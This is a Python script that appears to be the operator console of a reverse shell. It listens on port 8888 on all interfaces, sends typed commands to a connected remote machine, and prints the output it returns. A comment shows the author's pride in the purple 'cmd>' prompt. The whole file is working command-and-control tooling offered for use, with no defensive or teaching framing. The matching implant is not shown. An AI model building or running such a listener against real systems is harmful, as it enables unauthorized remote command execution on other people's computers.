import socket
# hosts on all interfaces
host = '0.0.0.0'
port = 8888
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind((host, port))
server_socket.listen(5)
print(f"[+] server listening as {host}:{port}")

while True:
    try:
        conn, addr = server_socket.accept()
        print(f"[+] {addr} connected to {host}:{port}")
        while True:
            prompt = "\033[95mcmd>\033[0m " # my fav thing i did here, was this cool "cmd>" command shit, and its purple this is so fucking cool
            try:
                command = input(prompt)
            except (KeyboardInterrupt, EOFError):
                conn.close()
                server_socket.close()
                exit(0)
            if command.strip() == '':
                continue
            if command.lower() == "exit":
                try:
                    conn.send(command.encode('utf-8'))
                except:
                    pass
                conn.close()
                break
                
            try:
                conn.send(command.encode('utf-8'))
            except:
                print(f"[-] Connection lost from '{addr}', waiting for reconnection...")
                break
            
            lengdata = b""
            while not lengdata.endswith(b"\n"):
                try:
                    chunk = conn.recv(1)
                    if not chunk:
                        break
                    lengdata += chunk
                except:
                    break
                
            if not lengdata:
                print(f"[-] Connection lost from '{addr}', waiting for reconnection...")
                break
                
            try:
                outlength = int(lengdata.decode('utf-8').strip())
            except ValueError:
                print("[-] bad length header received")
                continue
                
            receivedbytes = 0
            outputchunks = []
            while receivedbytes < outlength:
                try:
                    chunks = conn.recv(min(outlength - receivedbytes, 4096))
                    if not chunks:
                        break
                    outputchunks.append(chunks)
                    receivedbytes += len(chunks)
                except:
                    break
                    
            if receivedbytes < outlength:
                print(f"[-] Connection lost from '{addr}', waiting for reconnection...")
                break
                
            full_output = b"".join(outputchunks).decode('utf-8', errors='ignore')
            print(full_output, end='')
            
            if not full_output.endswith('\n'):
                print()
                
    except Exception as e:
        print(f"[-] Server error: {e}")
        try:
            conn.close()
        except:
            pass
